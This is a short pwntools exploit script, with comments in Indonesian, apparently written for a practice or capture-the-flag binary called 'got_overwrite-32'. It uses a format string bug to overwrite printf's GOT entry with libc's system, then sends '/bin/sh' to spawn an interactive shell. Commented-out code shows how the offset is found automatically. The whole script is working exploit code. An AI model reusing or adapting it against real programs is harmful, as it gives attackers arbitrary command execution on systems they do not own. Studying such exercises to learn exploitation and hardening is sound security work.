from pwn import *
elf = context.binary = ELF("./got_overwrite-32")
libc = elf.libc
libc.address = 0xf7d82000
offset = 5 #cari manual
# def send_payload(payload): #untuk dimasukkan di class FmtStr, dan akan dijalankan setiap saat dengan mengirim payload dari bawaan fmtstr, dan mengecek %1$p, %2$p, %3$p, hinggan menemukan %offset$p yang sama dengan payload, disini 7 offset nya
#     p = elf.process()
#     p.sendline(payload)
#     l = p.recvall().strip()
#     print(f"PAYLOAD NYA = {payload}")
#     print(f"HASILNYA = {l}")
#     p.close()
#     return l

# offset = FmtStr(send_payload).offset
# info(f"{offset=}")
p = process()
# Setelah menemukan offset nya kita bisa mengirimkan lokasi yang ingin kita tuju dan value yang ingin kita tulis    
payload = fmtstr_payload(offset, {elf.got['printf']: libc.sym['system']})
p.sendline(payload)
p.clean()
p.sendline('/bin/sh')
p.interactive()